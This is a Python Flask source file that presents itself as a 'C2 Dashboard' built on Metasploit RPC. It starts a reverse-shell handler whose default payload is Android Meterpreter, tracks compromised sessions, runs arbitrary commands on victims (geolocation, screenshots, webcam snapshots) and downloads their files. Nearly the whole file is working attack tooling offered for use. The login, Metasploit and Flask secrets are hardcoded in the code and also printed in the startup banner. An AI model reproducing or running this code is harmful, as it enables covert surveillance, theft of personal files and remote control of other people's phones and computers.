#!/usr/bin/env python3
# HAMZA SKU - Enhanced Working Version

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
from flask_socketio import SocketIO, emit
from pymetasploit3.msfrpc import MsfRpcClient
import hashlib
import os
import time
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hamza_secret_2026'
app.config['UPLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app, cors_allowed_origins="*")

os.makedirs('templates', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

# Password: hamza_sku_2026
CORRECT_HASH = '6078c92c7bc2e14f4d2bf1037d62514d8dd9ccd32573b1694cc640347b80d945'

msf = None
console = None
running = False
sessions = {}  # {session_id: {info}}
active_session_ids = set()  # Track only currently active sessions

def connect_msf():
    global msf
    try:
        msf = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=False)
        print("[+] Connected to MSF")
        return True
    except:
        try:
            msf = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
            print("[+] Connected to MSF (SSL)")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        pwd = request.json.get('password', '')
        if hashlib.sha256(pwd.encode()).hexdigest() == CORRECT_HASH:
            session['auth'] = True
            return jsonify({'success': True})
        return jsonify({'success': False, 'message': 'Wrong password'})
    
    if session.get('auth'):
        return redirect('/')
    return render_template('login.html')

@app.route('/')
def index():
    if not session.get('auth'):
        return redirect('/login')
    return render_template('setup.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('auth'):
        return redirect('/login')
    return render_template('dashboard.html')

@app.route('/session/<session_id>')
def session_page(session_id):
    if not session.get('auth'):
        return redirect('/login')
    return render_template('session.html', session_id=session_id)

@app.route('/api/handler/start', methods=['POST'])
def start_handler():
    global console, running, msf
    
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    if not msf:
        if not connect_msf():
            return jsonify({'success': False, 'message': 'MSF connection failed'})
    
    try:
        d = request.json
        host = d.get('host', '0.0.0.0')
        port = d.get('port', 4444)
        payload = d.get('payload', 'android/meterpreter/reverse_tcp')
        
        console = msf.consoles.console()
        
        console.write('use exploit/multi/handler')
        time.sleep(0.3)
        console.write(f'set PAYLOAD {payload}')
        time.sleep(0.3)
        console.write(f'set LHOST {host}')
        time.sleep(0.3)
        console.write(f'set LPORT {port}')
        time.sleep(0.3)
        console.write('set ExitOnSession false')
        time.sleep(0.3)
        console.write('exploit -j')
        time.sleep(1)
        
        out = console.read()
        print(out.get('data', ''))
        
        running = True
        threading.Thread(target=check_sessions, daemon=True).start()
        
        return jsonify({'success': True, 'message': f'Started on {host}:{port}'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/handler/stop', methods=['POST'])
def stop_handler():
    global running, console, msf
    
    if not session.get('auth'):
        return jsonify({'success': False})
    
    running = False
    
    try:
        if console:
            console.destroy()
        if msf:
            for jid in list(msf.jobs.list.keys()):
                msf.jobs.stop(jid)
    except:
        pass
    
    return jsonify({'success': True, 'message': 'Stopped'})

@app.route('/api/handler/status')
def handler_status():
    if not session.get('auth'):
        return jsonify({'active': False, 'msf_connected': False})
    return jsonify({'active': running, 'msf_connected': msf is not None})

@app.route('/api/sessions')
def get_sessions():
    global sessions, active_session_ids
    
    if not session.get('auth'):
        return jsonify({'sessions': [], 'count': 0})
    
    # Update active sessions from MSF
    if msf:
        try:
            current_ids = set(msf.sessions.list.keys())
            
            # Remove sessions that are no longer active
            removed_ids = active_session_ids - current_ids
            for sid in removed_ids:
                if sid in sessions:
                    del sessions[sid]
                    print(f"[-] Session {sid} removed (disconnected)")
            
            active_session_ids = current_ids
        except:
            pass
    
    # Return only active sessions
    active_sessions = [s for s in sessions.values() if s['id'] in active_session_ids]
    
    return jsonify({'sessions': active_sessions, 'count': len(active_sessions)})

@app.route('/api/command', methods=['POST'])
def run_command():
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    global msf
    
    try:
        data = request.json
        session_id = data.get('session_id')
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'success': False, 'output': 'Empty command'})
        
        if not msf:
            return jsonify({'success': False, 'output': 'MSF not connected'})
        
        # Execute command on session
        sess = msf.sessions.session(session_id)
        
        # Special handling for certain commands
        if command in ['geolocate', 'screenshot', 'webcam_snap']:
            # These commands need special handling
            output = sess.run_with_output(f'run post/multi/gather/{command}', timeout=30)
        else:
            output = sess.run_with_output(command, timeout=30)
        
        return jsonify({
            'success': True,
            'output': output if output else 'Command executed successfully',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'output': str(e)
        })

@app.route('/api/download', methods=['POST'])
def download_file():
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    global msf
    
    try:
        data = request.json
        session_id = data.get('session_id')
        file_path = data.get('file_path', '').strip()
        
        if not file_path:
            return jsonify({'success': False, 'message': 'Empty file path'})
        
        if not msf:
            return jsonify({'success': False, 'message': 'MSF not connected'})
        
        # Get session
        sess = msf.sessions.session(session_id)
        
        # Generate local filename
        filename = os.path.basename(file_path)
        if not filename:
            filename = f'download_{int(time.time())}'
        
        local_path = os.path.join('downloads', f'{session_id}_{filename}')
        
        # Download file
        sess.write(f'download {file_path} {local_path}')
        time.sleep(2)  # Wait for download
        
        # Check if file exists
        if os.path.exists(local_path):
            return jsonify({
                'success': True,
                'message': 'File downloaded successfully',
                'local_path': local_path,
                'filename': f'{session_id}_{filename}'
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Download failed - file not found'
            })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        })

@app.route('/downloads/<path:filename>')
def download_endpoint(filename):
    """Serve downloaded files"""
    if not session.get('auth'):
        return redirect('/login')
    return send_from_directory('downloads', filename, as_attachment=True)

def check_sessions():
    global sessions, msf, active_session_ids
    
    while running:
        try:
            if msf:
                current_sessions = msf.sessions.list
                current_ids = set(current_sessions.keys())
                
                # Add new sessions
                for sid, info in current_sessions.items():
                    if sid not in sessions:
                        ip = info.get('tunnel_peer', '').split(':')[0] or 'Unknown'
                        sessions[sid] = {
                            'id': sid,
                            'ip': ip,
                            'type': info.get('type'),
                            'platform': info.get('platform'),
                            'status': 'online'
                        }
                        active_session_ids.add(sid)
                        print(f"[+] New session: {sid} from {ip}")
                        socketio.emit('new_session', sessions[sid], broadcast=True)
                
                # Remove disconnected sessions
                removed_ids = active_session_ids - current_ids
                for sid in removed_ids:
                    if sid in sessions:
                        print(f"[-] Session {sid} disconnected")
                        del sessions[sid]
                
                active_session_ids = current_ids
                
        except Exception as e:
            print(f"[!] Session check error: {e}")
        
        time.sleep(5)

@socketio.on('connect')
def on_connect():
    emit('connected', {'status': 'ok'})

if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════╗
║       HAMZA SKU C2 Dashboard          ║
║         Enhanced Version              ║
╚═══════════════════════════════════════╝

[!] Start msfrpcd first:
    msfrpcd -P msf_password -S -a 127.0.0.1

[!] Then open:
    http://localhost:5000

[!] Password:
    hamza_sku_2026

[✓] Features:
    - Auto session cleanup
    - No duplicate sessions
    - File download support
    - 16 quick action buttons
    - Live terminal
""")
    
    connect_msf()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
